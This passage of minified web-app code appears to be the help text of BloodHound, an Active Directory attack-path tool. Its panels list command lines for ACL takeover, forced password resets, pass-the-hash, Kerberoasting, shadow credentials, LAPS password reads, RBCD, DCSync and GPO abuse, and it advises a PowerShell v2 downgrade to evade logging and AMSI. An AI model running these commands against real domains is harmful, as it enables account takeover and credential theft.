(NTAuthCertificates object) for the the AD forest of the domain node. The NTAuthStore holds the list of certificates trusted for authentication in the AD forest of the domain ",r,". When a user attempts to authenticate against a domain with a certificate, a domain controller will verify that the certificate is signed by a certificate in the NTAuthStore."]})}),Zu=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on certificates being stored in the NTAuthStore, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),em=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),tm=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"Certified Pre-Owned ADCS Whitepaper"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#BKMK_CertificatesInWindowsAuthentication",children:"Credentials Processes in Windows Authentication"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.pkisolutions.com/understanding-active-directory-certificate-services-containers-in-active-directory/",children:"Understanding Active Directory Certificate Services Containers in Active Directory"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.ravenswoodtechnology.com/components-of-a-pki-part-2/",children:"Components of a PKI, Part 2: Certificate Authorities and CA Hierarchies"})]}),rm=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on certificates being stored in the NTAuthStore, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),nm={general:Xu,windowsAbuse:rm,linuxAbuse:Zu,opsec:em,references:tm},am=({sourceName:r,targetName:a})=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["The IssuancePolicy ",r," has an OID group link to the group ",a,". Certificate templates may include ",r," as an issuance policy extension. Users authenticating using a certificate of such a certificate template will be granted access as a member of the ",a," group."]})}),om=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform the ADCS ESC13 abuse which relies on the OID group link. This relationship alone is not enough to escalate rights or impersonate other principals."}),im=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),sm=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53",children:"ADCS ESC13 Abuse Technique"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd378897(v=ws.10)?redirectedfrom=MSDN",children:"Authentication Mechanism Assurance for AD DS in Windows Server 2008 R2 Step-by-Step Guide"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.gradenegger.eu/en/using-authentication-mechanism-assurance-ama-to-secure-the-login-of-administrative-accounts/",children:"Use Authentication Mechanism Assurance (AMA) to secure administrative account logins"})]}),cm=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform the ADCS ESC13 abuse which relies on the OID group link. This relationship alone is not enough to escalate rights or impersonate other principals."}),lm={general:am,windowsAbuse:cm,linuxAbuse:om,opsec:im,references:sm},dm=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," ownership of the ",N(i)," ",o,"."]}),e.jsxs(t,{variant:"body2",children:["The owner of an object is implicitly granted the ability to modify object security descriptors, including the DACL, when the following conditions are met:",e.jsx("br",{}),e.jsxs("ul",{children:[e.jsx("li",{children:"The OWNER RIGHTS SID (S-1-3-4) is not explicitly granted privileges on the object"}),e.jsx(t,{component:"pre",children:'(Get-ACL -Path ("AD:" + "CN=Object,DC=example,DC=com")).Access | Where-Object { $_.IdentityReference -eq "OWNER RIGHTS" }'}),e.jsx("br",{}),"OR",e.jsx("br",{}),e.jsx("br",{}),e.jsx("li",{children:"Implicit owner rights are not blocked"})]})]}),e.jsxs(t,{variant:"body2",children:["Implicit owner rights are not blocked and are therefore abusable when the following conditions are met:",e.jsxs("ul",{children:[e.jsx("li",{children:"The domain's BlockOwnerImplicitRights setting is not in enforcement mode. This setting is defined in the 29th character in the domain's dSHeuristics attribute. When set to 0 or 2, implicit owner rights are not blocked."}),e.jsx(t,{component:"pre",children:`$searcher = [adsisearcher]""
$searcher.SearchRoot = "LDAP://CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=EXAMPLE,DC=LOCAL"
$searcher.SearchScope = [System.DirectoryServices.SearchScope]::Base
$searcher.Filter = "(objectClass=*)"
$searcher.PropertiesToLoad.Add("DSHeuristics") | Out-Null
$result = $searcher.FindOne()
Write-Output "DSHeuristics: $($result.Properties['DSHeuristics'])"`}),e.jsx("br",{}),"AND EITHER:",e.jsx("br",{}),e.jsx("br",{}),e.jsx("li",{children:"The object is not a computer or derivative of a computer object (e.g., MSA, GMSA)"}),e.jsx("br",{}),"OR",e.jsx("br",{}),e.jsx("br",{}),e.jsx("li",{children:"The object is a computer or derivative of a computer object and the owner is a member of the Domain Admins or Enterprise Admins group (or is the SID of either group)"})]})]})]}),hm=({sourceName:r,targetName:a,targetType:o,haslaps:i})=>{switch(o){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Modifying the rights "}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a group object, you may grant yourself the AddMember permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Adding to the group "}),e.jsx(t,{variant:"body2",children:"You can now add members to the group."}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsx(t,{variant:"body1",children:" Cleanup "}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),e.jsx(t,{variant:"body1",children:" Force Change Password "}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return i?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsxs(t,{variant:"body2",children:["The GenericAll permission allows ",r," to retrieve the LAPS (RID 500 administrator) password for ",a,"."]}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:"}),e.jsx(t,{component:"pre",children:"bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"}),e.jsx(t,{variant:"body2",children:"See Windows abuse for retrieving and decrypting the encrypted attributes."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'DCSync' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'DCSync' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" DCSync "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission grants ",r," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",a,"."]}),e.jsx(t,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to obtain control of the objects of the domain is to apply a GenericAll ACE on the domain that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'DomainDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"The compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any user or computer with inheritance disabled, including objects located in nested OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on a domain object through an alternative attack vector. Indeed, with GenericAll permissions over a domain object, you may make modifications to the gPLink attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a Linux machine, the gPLink manipulation attack vector may be exploited using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a GPO, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With ownership of the OU object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a Linux machine, the gPLink manipulation attack vector may be exploited using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Container"}),e.jsx(t,{variant:"body2",children:"With ownership of the container object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"CertTemplate":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With ownership over a certificate template, you can grant yourself GenericAll. With GenericAll, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node."})});case"EnterpriseCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With ownership over an enterprise CA, you can grant yourself GenericAll. With GenericAll, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation."})});case"RootCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With ownership over a root CA, you can grant yourself GenericAll. With GenericAll, you can make a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"NTAuthStore":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With ownership over a NTAuth store, you can grant yourself GenericAll. With GenericAll, you can make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation. This action may enable you to perform an ADCS domain escalation."})});case"IssuancePolicy":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With ownership over an issuance policy object, you can grant yourself GenericAll. With GenericAll, you create a OID group link to a targeted group by adding the groups distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."})});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},pm=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),e.jsx(t,{variant:"body2",children:"Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request."}),e.jsx(t,{variant:"body2",children:"Additional opsec considerations depend on the target object and how to take advantage of this permission. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."})]}),um=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm",children:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener 